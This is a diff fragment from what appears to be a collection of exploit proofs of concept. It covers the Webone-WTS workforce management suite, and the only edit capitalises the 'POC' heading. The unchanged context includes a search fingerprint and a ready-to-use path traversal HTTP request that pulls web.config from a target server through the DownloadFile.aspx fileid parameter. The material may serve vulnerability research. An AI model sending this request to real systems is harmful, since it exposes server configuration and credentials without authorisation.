@@ -7,7 +7,7 @@
 title="Webone-WTS劳动力管理套件"
 ```
 
-## poc
+## POC
 ```
 GET /webForms/Download/DownloadFile.aspx?fileid=../../../web.config&flag=report HTTP/1.1
 Host: [目标服务器域名或IP]
